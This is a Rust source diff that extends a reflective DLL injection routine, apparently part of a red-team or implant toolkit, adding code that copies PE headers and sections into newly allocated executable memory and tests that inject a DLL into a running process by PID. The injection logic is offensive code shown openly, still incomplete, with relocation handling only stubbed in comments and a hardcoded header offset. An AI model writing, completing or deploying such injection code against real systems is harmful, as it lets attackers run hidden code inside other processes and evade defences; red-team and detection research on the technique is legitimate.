@@ -74,7 +74,7 @@ impl PeFileHeaders64 {
 }
 
 #[cfg(target_arch = "x86")]
-impl PeFileHeaders64 {
+impl PeFileHeaders32 {
     fn new(dll_bytes: Vec<u8>) -> Result<Self> {
         let dos_header_base_ref = dll_bytes.as_ptr() as usize;
         let dos_headers = unsafe { *((dos_header_base_ref) as *mut IMAGE_DOS_HEADER) };
@@ -83,7 +83,7 @@ impl PeFileHeaders64 {
         }
     
         let nt_header_base_ref = dos_header_base_ref + dos_headers.e_lfanew as usize;
-        let nt_headers = unsafe { *((nt_header_base_ref) as *mut IMAGE_NT_HEADERS64) };
+        let nt_headers = unsafe { *((nt_header_base_ref) as *mut IMAGE_NT_HEADERS32) };
         
         let mut section_headers_ref = unsafe{*((nt_header_base_ref + 264 as usize ) as *mut IMAGE_SECTION_HEADER)};
         let mut section_headers: Vec<IMAGE_SECTION_HEADER> = Vec::new();
@@ -149,7 +149,34 @@ fn write_vec_to_memory(dst_mem_address: *mut c_void, src_vec_bytes: Vec<u8>, max
     Ok(())
 }
 
-pub fn handle_dll_reflect(dll_bytes: Vec<u8>, pid: u32) -> Result<NoneType> {
+fn write_n_bytes_to_memory(dst_mem_address: *mut c_void, src_mem_address: *const c_void, max_bytes_to_write: u32) -> Result<()> {
+    let mut index: u32 = 0;
+    while index <  max_bytes_to_write {
+        let tmp_byte_val = unsafe { *((src_mem_address as usize + index as usize) as *const u8) };
+        unsafe { ((dst_mem_address as usize+index as usize) as *mut c_void).write_bytes(tmp_byte_val, 1) };
+        index = index + 1;
+    }
+    Ok(())
+}
+
+fn relocate_dll_image_sections(new_dll_base: *mut c_void, old_dll_bytes: *const c_void, pe_file_headers: PeFileHeaders64) -> Result<()> {
+
+    for (_section_index, section) in pe_file_headers.section_headers.iter().enumerate() {
+
+        // LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
+        let section_destination = new_dll_base as usize + section.VirtualAddress as usize;
+        // LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
+        let section_bytes = old_dll_bytes as usize + section.PointerToRawData as usize;
+        // std::memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
+        write_n_bytes_to_memory(section_destination as *mut c_void, section_bytes as *const c_void, section.SizeOfRawData)?;
+
+        println!("{:?}", String::from_utf8(section.Name.to_vec())?);
+    }
+
+    Ok(())
+}
+
+pub fn handle_dll_reflect(dll_bytes: Vec<u8>, pid: Option<u32>) -> Result<NoneType> {
     #[cfg(not(target_os = "windows"))]
     return Err(anyhow::anyhow!("This OS isn't supported by the dll_reflect function.\nOnly windows systems are supported"));
 
@@ -164,6 +191,13 @@ pub fn handle_dll_reflect(dll_bytes: Vec<u8>, pid: u32) -> Result<NoneType> {
     // Write our DLL headers into the newly allocated memory.
     write_vec_to_memory(new_dll_base, dll_bytes.clone(), pe_header.nt_headers.OptionalHeader.SizeOfHeaders)?;
 
+    // copy over DLL image sections to the newly allocated space for the DLL
+    relocate_dll_image_sections(new_dll_base, dll_bytes.clone().as_ptr() as *const c_void, pe_header.clone())?;
+
+    // perform image base relocations
+    //	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+
     // Get distance between new dll memory and on disk image base.
     if pe_header.nt_headers.OptionalHeader.ImageBase as usize > new_dll_base as usize {
         return Err(anyhow::anyhow!("image_base ptr was greater than dll_mem ptr."));
@@ -175,6 +209,8 @@ pub fn handle_dll_reflect(dll_bytes: Vec<u8>, pid: u32) -> Result<NoneType> {
     Ok(NoneType)
 }
 
+
+
 fn get_u8_vec_form_u32_vec(u32_vec: Vec<u32>) -> Result<Vec<u8>> {
     let res_u8_vec: Vec<u8> = u32_vec.iter().map(|x| if *x < u8::MAX as u32 { *x as u8 }else{ u8::MAX }).collect();
     Ok(res_u8_vec)
@@ -182,7 +218,7 @@ fn get_u8_vec_form_u32_vec(u32_vec: Vec<u32>) -> Result<Vec<u8>> {
 
 pub fn dll_reflect(dll_bytes: Vec<u32>, pid: u32) -> Result<NoneType> {
     let local_dll_bytes = get_u8_vec_form_u32_vec(dll_bytes)?;
-    handle_dll_reflect(local_dll_bytes, pid)
+    handle_dll_reflect(local_dll_bytes, Some(pid))
 }
 
 #[cfg(target_os = "windows")]
@@ -203,6 +239,25 @@ mod tests {
         let test_buffer: Vec<u8> = vec![104, 101, 108, 108, 111, 95, 119, 111, 114, 108, 100, 95, 49, 50, 0];
 
         write_vec_to_memory(new_dll_base, test_buffer.clone(), buf_size as u32);
+
+        let mut tmp_dll_base = new_dll_base.clone();
+        for (index, byte) in test_buffer.iter().enumerate() {
+            let res = unsafe { *(tmp_dll_base as *mut u8) };
+            assert_eq!(*byte, res);
+            tmp_dll_base = (tmp_dll_base as usize + 1 as usize) as *mut c_void;
+        }
+        Ok(())
+    }
+
+    #[test]
+    fn test_dll_reflect_write_n_bytes_to_memory() -> anyhow::Result<()>{
+        // Get the path to our test dll file.
+        let buf_size: usize = 16;
+        let new_dll_base = unsafe { VirtualAlloc(ptr::null(), buf_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
+        let test_buffer: Vec<u8> = vec![104, 101, 108, 108, 111, 95, 119, 111, 114, 108, 100, 95, 49, 50, 0];
+        let test_buffer_ref = test_buffer.as_ptr() as *const c_void;
+
+        write_n_bytes_to_memory(new_dll_base, test_buffer_ref, buf_size as u32);
 
         let mut tmp_dll_base = new_dll_base.clone();
         for (index, byte) in test_buffer.iter().enumerate() {
@@ -257,7 +312,7 @@ mod tests {
         let target_pid = expected_process.unwrap().id();
 
         // Run our code.
-        let _res = handle_dll_reflect(dll_bytes, target_pid)?;
+        let _res = handle_dll_reflect(dll_bytes, Some(target_pid))?;
 
         let delay = time::Duration::from_secs(DLL_EXEC_WAIT_TIME);
         thread::sleep(delay);
